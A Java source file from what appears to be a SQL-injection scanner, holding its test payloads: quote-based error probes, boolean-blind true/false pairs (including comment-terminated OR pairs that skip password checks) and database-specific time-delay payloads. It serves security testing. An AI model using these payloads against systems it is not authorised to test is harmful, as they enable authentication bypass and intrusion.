package com.sqlihunter.mutation;

import java.util.List;

/**
 * Non-destructive SQL-injection test payloads.
 *
 * <p>Every payload here is read-only in intent: it aims to provoke a parse-time
 * error, a boolean branch difference, or a controlled delay. None modify data,
 * dump tables, read files, stack additional statements, or call administrative
 * procedures. Destructive constructs (DROP/DELETE/UPDATE/INSERT, xp_cmdshell,
 * UNION-based data extraction, OUTFILE, etc.) are deliberately absent.
 */
public final class Payloads {

    private Payloads() {
    }

    /** Error-based probes: appended/substituted to break SQL syntax harmlessly. */
    public static final List<String> ERROR_PROBES = List.of(
            "'",
            "\"",
            "')",
            "';",
            "\\",
            "`",
            "'\"",
            "' OR '1'='1' -- "   // parse-level only; evaluated below for boolean too
    );

    /** A true/false pair for boolean-blind testing. */
    public static final class BooleanPair {
        public final String truePayload;
        public final String falsePayload;
        public final String description;

        BooleanPair(String truePayload, String falsePayload, String description) {
            this.truePayload = truePayload;
            this.falsePayload = falsePayload;
            this.description = description;
        }
    }

    /**
     * Boolean pairs. The suffix form appends to the original value; the engine
     * uses {originalValue + payload} so the comparison stays close to baseline.
     * Each pair is logically (TRUE, FALSE): a non-injectable parameter yields
     * near-identical responses for both; an injectable one diverges.
     */
    public static List<BooleanPair> booleanPairs(String original) {
        String o = original == null ? "" : original;
        return List.of(
                // Comment-terminated AND pairs. These are the key for login/auth
                // contexts with a VALID identifier: the trailing "--" comments out
                // the rest of the query (e.g. the password check), so TRUE returns
                // the row (success) and FALSE returns none (failure) -> they diverge
                // even when the body is empty and only status/redirect changes.
                new BooleanPair(o + "' AND '1'='1' -- ", o + "' AND '1'='2' -- ",
                        "single-quote AND with comment terminator"),
                new BooleanPair(o + "\" AND \"1\"=\"1\" -- ", o + "\" AND \"1\"=\"2\" -- ",
                        "double-quote AND with comment terminator"),
                new BooleanPair(o + " AND 1=1 -- ", o + " AND 1=2 -- ",
                        "numeric AND with comment terminator"),
                // OR with comment terminator: diverges for an INVALID identifier
                // (TRUE matches all rows, FALSE matches none).
                new BooleanPair(o + "' OR '1'='1' -- ", o + "' OR '1'='2' -- ",
                        "single-quote OR with comment terminator"),
                // Plain in-context pairs (no comment): for data-retrieval endpoints
                // where the parameter sits inside a WHERE clause already.
                new BooleanPair(o + "' AND '1'='1", o + "' AND '1'='2",
                        "single-quote string context AND true/false"),
                new BooleanPair(o + "\" AND \"1\"=\"1", o + "\" AND \"1\"=\"2",
                        "double-quote string context AND true/false"),
                new BooleanPair(o + " AND 1=1", o + " AND 1=2",
                        "numeric context AND true/false")
        );
    }

    /** Time-based payloads keyed to a delay in seconds, per database family. */
    public static final class TimePayload {
        public final String family;
        public final String template; // contains {S} placeholder for seconds
        TimePayload(String family, String template) {
            this.family = family;
            this.template = template;
        }
        public String render(int seconds) {
            return template.replace("{S}", Integer.toString(seconds));
        }
    }

    /**
     * Conservative time-based payloads. Used only when the tester explicitly
     * enables time-based testing. The engine applies them as
     * {originalValue + payload} with a single, bounded delay.
     */
    public static List<TimePayload> timePayloads() {
        return List.of(
                new TimePayload("MySQL/MariaDB", "' AND SLEEP({S}) -- "),
                new TimePayload("MySQL numeric", " AND SLEEP({S}) -- "),
                new TimePayload("PostgreSQL", "' AND pg_sleep({S}) -- "),
                new TimePayload("Microsoft SQL Server", "'; WAITFOR DELAY '0:0:{S}' -- "),
                new TimePayload("Oracle", "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{S})=1 -- ")
        );
    }

    /** A benign control payload that should NOT cause a delay. */
    public static String timingControl(String original) {
        String o = original == null ? "" : original;
        return o + "' AND '1'='1";
    }
}
